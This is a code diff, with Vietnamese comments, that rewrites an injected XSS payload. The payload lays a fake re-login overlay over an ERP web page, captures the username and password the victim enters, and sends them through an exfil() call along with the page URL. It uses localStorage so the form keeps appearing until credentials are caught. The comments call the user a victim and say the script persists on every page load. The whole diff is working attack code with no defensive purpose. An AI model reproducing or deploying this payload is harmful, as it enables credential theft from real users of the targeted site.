@@ -198,36 +198,115 @@
   // - localStorage '__xss_phish_done' = '1' → đã có dữ liệu → KHÔNG hiện
   // - Chưa có → hiện form mỗi lần truy cập cho đến khi nhập xong
   // - Khi nạn nhân nhập + bấm nút → gửi dữ liệu → set done → không hiện nữa
-  try {
-    var phishDone = localStorage.getItem('__xss_phish_done') === '1';
-    if (!phishDone) {
-      var o = document.createElement('div');
-      o.innerHTML =
-        '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center;">' +
-        '<div style="background:#fff;padding:30px;border-radius:8px;width:350px;font-family:Arial;font-size:14px;">' +
-        '<h2 style="margin:0 0 15px 0;color:#1976d2;text-align:center;">Đăng Nhập</h2>' +
-        '<p style="margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;">Phiên làm việc đã kết thúc. Vui lòng xác thực lại.</p>' +
-        '<input type="text" id="xss_phish_user" placeholder="Tên đăng nhập" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;">' +
-        '<input type="password" id="xss_phish_pass" placeholder="Mật khẩu" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;">' +
-        '<button id="xss_phish_btn" style="width:100%;padding:10px;background:#1976d2;color:#fff;border:none;border-radius:4px;cursor:pointer;">Xác nhận</button>' +
-        '</div></div>';
-      document.body.appendChild(o);
-      document.getElementById('xss_phish_btn').onclick = function() {
-        var u = document.getElementById('xss_phish_user').value;
-        var p = document.getElementById('xss_phish_pass').value;
-        // Gửi dữ liệu về server (dạng object)
-        exfil({
-          username: u,
-          password: p,
-          url: pageInfo.url
-        }, 'pwd');
-        // Đánh dấu đã có dữ liệu → không hiện form nữa
+  // TẠO FORM PHISHING (DOM API thuần - không dùng innerHTML)
+  function createPhishForm() {
+    try {
+      var phishDone = localStorage.getItem('__xss_phish_done') === '1';
+      if (phishDone) return;
+      
+      // --- Tạo overlay ---
+      var overlay = document.createElement('div');
+      overlay.setAttribute('id', 'xss_phish_overlay');
+      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
+        'background:rgba(0,0,0,0.9);z-index:2147483647;display:flex;' +
+        'align-items:center;justify-content:center;pointer-events:auto;';
+      
+      // Chặn sự kiện lan ra trang ERP (tránh bị nuốt)
+      overlay.addEventListener('click', function(e) { e.stopPropagation(); });
+      overlay.addEventListener('mousedown', function(e) { e.stopPropagation(); });
+      overlay.addEventListener('pointerdown', function(e) { e.stopPropagation(); });
+      overlay.addEventListener('keydown', function(e) { e.stopPropagation(); });
+      
+      // --- Tạo hộp form giả mạo ---
+      var box = document.createElement('div');
+      box.style.cssText = 'background:#fff;padding:30px;border-radius:8px;width:350px;' +
+        'font-family:Arial,Helvetica,sans-serif;font-size:14px;pointer-events:auto;' +
+        'position:relative;z-index:2147483647;box-shadow:0 0 30px rgba(0,0,0,0.5);';
+      
+      // Tiêu đề
+      var title = document.createElement('h2');
+      title.textContent = 'Đăng Nhập';
+      title.style.cssText = 'margin:0 0 15px 0;color:#1976d2;text-align:center;';
+      box.appendChild(title);
+      
+      // Thông báo
+      var msg = document.createElement('p');
+      msg.textContent = 'Phiên làm việc đã kết thúc. Vui lòng xác thực lại.';
+      msg.style.cssText = 'margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;';
+      box.appendChild(msg);
+      
+      // Ô username
+      var userInput = document.createElement('input');
+      userInput.setAttribute('type', 'text');
+      userInput.setAttribute('placeholder', 'Tên đăng nhập');
+      userInput.setAttribute('id', 'xss_phish_user');
+      userInput.style.cssText = 'width:100%;padding:10px;margin-bottom:10px;' +
+        'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;' +
+        'pointer-events:auto;';
+      box.appendChild(userInput);
+      
+      // Ô password
+      var passInput = document.createElement('input');
+      passInput.setAttribute('type', 'password');
+      passInput.setAttribute('placeholder', 'Mật khẩu');
+      passInput.setAttribute('id', 'xss_phish_pass');
+      passInput.style.cssText = 'width:100%;padding:10px;margin-bottom:15px;' +
+        'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;' +
+        'pointer-events:auto;';
+      box.appendChild(passInput);
+      
+      // Nút xác nhận
+      var btn = document.createElement('button');
+      btn.textContent = 'Xác nhận';
+      btn.setAttribute('id', 'xss_phish_btn');
+      btn.style.cssText = 'width:100%;padding:10px;background:#1976d2;color:#fff;' +
+        'border:none;border-radius:4px;cursor:pointer;pointer-events:auto;';
+      box.appendChild(btn);
+      
+      overlay.appendChild(box);
+      document.body.appendChild(overlay);
+      
+      // Focus vào ô username
+      setTimeout(function() {
+        try { userInput.focus(); } catch(e) {}
+      }, 100);
+      
+      // Xử lý nút bấm
+      btn.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var u = userInput.value;
+        var p = passInput.value;
+        // Gửi dữ liệu về server
+        exfil({ username: u, password: p, url: pageInfo.url }, 'pwd');
+        // Đánh dấu đã có dữ liệu
         try { localStorage.setItem('__xss_phish_done', '1'); } catch(e2) {}
         // Ẩn form
-        o.remove();
-      };
+        overlay.remove();
+      });
+      
+      // Cho phép Enter submit
+      document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          var u = userInput.value;
+          var p = passInput.value;
+          if (u || p) {
+            try { localStorage.setItem('__xss_phish_done', '1'); } catch(e2) {}
+            exfil({ username: u, password: p, url: pageInfo.url }, 'pwd');
+            overlay.remove();
+          }
+        }
+      });
+      
+      console.log('[phish] Form đã tạo - có thể điền được');
+      
+    } catch(e) {
+      console.log('[phish] Lỗi tạo form:', e.message);
     }
-  } catch(e) {}
+  }
+  
+  // Hiện form sau 1 giây (đợi trang load xong, tránh script ERP ghi đè)
+  setTimeout(createPhishForm, 1000);
 
   // ============================================================
   // CHẠY NGẦM MỖI KHI TRANG LOAD - KHÔNG TỰ XÓA PAYLOAD
